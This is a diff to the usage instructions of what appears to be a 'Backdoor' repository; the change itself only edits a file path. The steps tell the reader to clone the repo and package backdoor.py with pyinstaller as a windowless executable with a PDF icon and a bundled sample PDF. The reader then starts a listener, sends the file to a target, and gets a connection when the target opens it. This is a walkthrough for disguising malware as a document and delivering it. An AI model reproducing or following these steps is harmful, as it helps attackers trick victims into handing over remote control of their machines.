@@ -12,7 +12,7 @@ You should have these requirements :
 ## Steps :
 1. do git clone https://github.com/Anonomous69/Backdoor
 2. cd to directory
-3. do C:\Users\username\Appdata\Local\Python\Python3.12\Scripts\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
+3. do C:\Users\username\Appdata\wherever\your\pyinstaller\is\there\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
 4. The created backdoor must be in your "dist" folder in that directory
 5. Run Listener is your machine and send the backdoor to target
 6. when target clicks backdoor, u get the connection
